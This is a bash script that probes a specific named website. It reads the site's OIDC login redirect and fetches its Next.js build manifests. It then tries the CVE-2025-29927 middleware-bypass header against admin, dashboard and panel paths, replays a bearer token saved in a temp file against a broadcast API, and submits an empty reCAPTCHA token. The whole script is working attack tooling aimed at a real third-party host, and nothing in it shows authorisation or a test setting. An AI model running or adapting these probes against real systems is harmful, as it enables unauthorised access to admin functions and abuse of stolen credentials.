#!/bin/bash
set -u
UA='Mozilla/5.0'
B=https://onlyfakeai.ru
BUILD=S2HurGa5cGUpA5514zy3f

echo "=== OIDC start redirect ==="
curl -sS -k -m 25 -A "$UA" -D - -o /dev/null "$B/api/auth/telegram-oidc/start?locale=en" | grep -iE '^(HTTP/|location|set-cookie)' | tr -d '\r'

echo
echo "=== build manifests ==="
for f in _buildManifest.js _ssgManifest.js _middlewareManifest.js app-build-manifest.json build-manifest.json routes-manifest.json; do
  code=$(curl -sS -k -m 15 -A "$UA" -o /tmp/m.bin -w '%{http_code}' "$B/_next/static/$BUILD/$f")
  echo "[$code] $f $(wc -c < /tmp/m.bin)"
done

echo
echo "=== middleware bypass on admin paths (CVE-2025-29927) ==="
for p in /admin /en/admin /admin/login /dashboard /panel; do
  for h in "" "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"; do
    if [ -z "$h" ]; then
      code=$(curl -sS -k -m 15 -A "$UA" -o /tmp/m.bin -w '%{http_code}' "$B$p")
    else
      code=$(curl -sS -k -m 15 -A "$UA" -H "$h" -o /tmp/m.bin -w '%{http_code}' "$B$p")
    fi
    echo "[$code] $p $([ -n "$h" ] && echo '(bypass hdr)')"
  done
done

echo
echo "=== broadcast GET with token ==="
TOK=$(cat /tmp/token.txt 2>/dev/null || true)
if [ -n "${TOK:-}" ]; then
  curl -sS -k -m 20 -A "$UA" -H "Authorization: Bearer $TOK" -o /tmp/bc.bin -w 'HTTP %{http_code}\n' "$B/api/broadcast"
  head -c 400 /tmp/bc.bin; echo
fi

echo
echo "=== verify-recaptcha empty ==="
curl -sS -k -m 20 -A "$UA" -H 'Content-Type: application/json' -d '{"token":""}' -o /tmp/rc.bin -w 'HTTP %{http_code}\n' "$B/api/verify-recaptcha"
head -c 300 /tmp/rc.bin; echo
